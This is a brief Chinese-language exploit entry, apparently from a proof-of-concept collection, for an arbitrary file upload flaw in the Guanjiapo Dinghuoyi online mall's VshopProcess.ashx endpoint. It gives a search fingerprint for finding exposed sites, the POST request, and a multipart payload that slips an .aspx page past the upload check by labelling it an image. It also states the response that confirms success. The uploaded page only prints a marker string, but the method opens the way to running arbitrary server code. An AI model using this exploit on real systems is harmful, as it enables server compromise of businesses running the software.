# 管家婆订货易在线商城VshopProcess任意文件上传漏洞

管家婆订货易在线商城VshopProcess ｜ 文件上传 ｜ —
- **指纹**：`title="订货易"`
- **请求**：`POST /API/VshopProcess.ashx?action=PostFileImg HTTP/1.1`

**Payload**
```
------WebKitFormBoundarytCOFhbEjc3IfYaY5
Content-Disposition: form-data; name="fileup1i"; filename="dudesite.aspx"
Content-Type: image/jpeg
<%@ Page Language="C#" %>
<%
Response.Write("dudesite");
%>
------WebKitFormBoundarytCOFhbEjc3IfYaY5--
```
- **响应特征**：200 aspx